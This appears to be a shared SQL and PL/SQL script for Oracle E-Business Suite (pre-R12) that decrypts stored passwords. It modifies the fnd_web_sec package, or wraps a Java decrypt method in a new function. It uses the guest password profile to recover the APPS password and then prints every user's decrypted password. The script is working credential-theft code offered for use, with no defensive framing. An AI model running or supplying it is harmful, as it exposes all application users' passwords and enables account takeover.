/*
  Borrowed from Anil Passi
  Code for decripting usr passwords
*/

-- to be able to decrypt fnd_user passfords add the fillowing lone to apps.fnd_web_sec package header

FUNCTION decrypt(key IN VARCHAR2, value IN VARCHAR2)
  RETURN VARCHAR2;

-- you can verify the decript function executing the following

WITH guest AS
       (
          SELECT UPPER (fnd_profile.VALUE ('GUEST_USER_PWD')) user_pwd,
                 UPPER (SUBSTR (fnd_profile.VALUE ('GUEST_USER_PWD'),
                                1,
                                  INSTR (fnd_profile.VALUE ('GUEST_USER_PWD'),
                                         '/'
                                        )
                                - 1
                               )
                       ) user_name
            FROM DUAL)
  SELECT fnd_web_sec.decrypt (guest.user_pwd,
                              fnd_user.encrypted_foundation_password
                             ) apps_password
    FROM fnd_user,
         guest
   WHERE fnd_user.user_name = guest.user_name

-- And get all user paswords with this script

WITH guest AS
       (
          SELECT UPPER (fnd_profile.VALUE ('GUEST_USER_PWD')) user_pwd,
                 UPPER (SUBSTR (fnd_profile.VALUE ('GUEST_USER_PWD'),
                                1,
                                  INSTR (fnd_profile.VALUE ('GUEST_USER_PWD'),
                                         '/'
                                        )
                                - 1
                               )
                       ) user_name
            FROM DUAL)
  SELECT   fnd_user.user_name,
           fnd_web_sec.decrypt
              ((SELECT fnd_web_sec.decrypt
                                         (guest.user_pwd,
                                          fnd_user.encrypted_foundation_password
                                         ) apps_password
                  FROM fnd_user,
                       guest
                 WHERE fnd_user.user_name = guest.user_name),
               fnd_user.encrypted_user_password
              ) decrypted_user_password
      FROM fnd_user
  ORDER BY fnd_user.user_name

-- IF you dont want to brake standard oracle packages you can create the following function insted of making the original function public
-- create a decryption function

CREATE OR REPLACE
function jve_test(key in varchar2, value in varchar2)
  return varchar2
  as language java name 'oracle.apps.fnd.security.WebSessionManagerProc.decrypt(java.lang.String,java.lang.String) return java.lang.String';
/

-- And replace fnd_web_sec.decrypt with the previously created function

WITH guest AS
       (
          SELECT UPPER (fnd_profile.VALUE ('GUEST_USER_PWD')) user_pwd,
                 UPPER (SUBSTR (fnd_profile.VALUE ('GUEST_USER_PWD'),
                                1,
                                  INSTR (fnd_profile.VALUE ('GUEST_USER_PWD'),
                                         '/'
                                        )
                                - 1
                               )
                       ) user_name
            FROM DUAL)
  SELECT   fnd_user.user_name,
           jve_test
              ((SELECT jve_test
                                         (guest.user_pwd,
                                          fnd_user.encrypted_foundation_password
                                         ) apps_password
                  FROM fnd_user,
                       guest
                 WHERE fnd_user.user_name = guest.user_name),
               fnd_user.encrypted_user_password
              ) decrypted_user_password
      FROM fnd_user
  ORDER BY fnd_user.user_name

  -- enjoy
  -- P.S. won't work with R12

